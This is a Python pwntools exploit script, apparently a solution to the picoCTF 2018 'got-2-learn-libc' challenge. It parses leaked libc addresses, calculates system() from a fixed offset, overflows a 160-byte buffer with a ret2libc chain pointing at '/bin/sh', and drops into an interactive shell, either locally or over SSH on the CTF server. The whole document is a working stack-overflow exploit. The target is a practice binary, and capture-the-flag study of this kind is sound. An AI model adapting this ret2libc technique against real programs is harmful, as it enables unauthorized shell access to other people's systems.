#!/usr/bin/env python3

from pwn import *
from re import findall

debug = 1

if debug:
  context.log_level = 'debug'
  proc = process('./vuln')
  offset = -174400
else:
  context.log_level = 'critical'
  s = ssh(host='2018shell1.picoctf.com', user='REDACTED',password='REDACTED')
  s.set_working_directory('/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33')
  proc = s.process('./vuln')
  offset = -149504

recv = proc.recvuntil('string:\n').decode()
puts_plt = int(findall('puts: (.*)', recv)[0], 16)
bin_sh = int(findall('useful_string: (.*)', recv)[0], 16)
log.info('Puts address: {}'.format(hex(puts_plt)))
log.info('Binsh address: {}'.format(hex(bin_sh)))
system_plt = puts_plt + offset
  
payload = b'A' * 160
payload += p32(system_plt)
payload += b'XXXX'
payload += p32(bin_sh)

proc.sendline(payload)
proc.interactive()
